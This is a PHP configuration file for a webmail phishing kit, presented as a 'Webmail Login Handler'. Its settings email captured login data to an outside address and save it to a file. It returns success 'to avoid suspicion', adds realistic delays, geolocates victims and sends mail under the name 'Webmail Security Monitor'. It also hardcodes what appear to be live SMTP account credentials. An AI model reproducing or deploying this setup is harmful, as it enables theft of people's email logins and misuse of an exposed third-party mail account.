<?php
/**
 * Configuration file for Webmail Login Handler
 * Edit these settings according to your needs
 */

// Email Configuration - REQUIRED
const CONFIG = [
    // SMTP Settings (for sending notifications)
    'smtp_host' => 'mail.globalrisk.rw',
    'smtp_port' => 587,
    'smtp_username' => 'jered@globalrisk.rw',
    'smtp_password' => 'global.321',
    'smtp_encryption' => 'tls',
    
    // Email Recipients and Sender
    'receiver_email' => 'lenalaluno@web.de',    // Where to send captured login data
    'sender_email' => 'jered@globalrisk.rw',    // From address for notifications
    'sender_name' => 'Webmail Security Monitor',
    
    // Security Settings
    'rate_limit_requests' => 10,                // Max attempts per hour per IP
    'rate_limit_window' => 3600,               // Time window in seconds (1 hour)
    
    // Logging
    'log_file' => 'logs/webmail_activity.log',
    'submission_file' => 'data/captured_logins.txt',
    
    // Response Settings
    'always_return_success' => true,           // Return "ok" even on capture to avoid suspicion
    'simulate_delay' => true,                  // Add realistic delay to login response
    'delay_min' => 800,                        // Min delay in milliseconds
    'delay_max' => 1500,                       // Max delay in milliseconds
];

// Advanced Configuration (usually don't need to change)
const ADVANCED_CONFIG = [
    // Geolocation Service
    'geo_service_url' => 'http://ip-api.com/json/',
    'geo_timeout' => 5,
    
    // Security Headers
    'enable_cors' => true,
    'enable_security_headers' => true,
    
    // File Permissions
    'log_file_permissions' => 0644,
    'data_file_permissions' => 0644,
];

// Create necessary directories if they don't exist
$logDir = dirname(CONFIG['log_file']);
$dataDir = dirname(CONFIG['submission_file']);

if (!is_dir($logDir)) {
    mkdir($logDir, 0755, true);
}

if (!is_dir($dataDir)) {
    mkdir($dataDir, 0755, true);
}
?>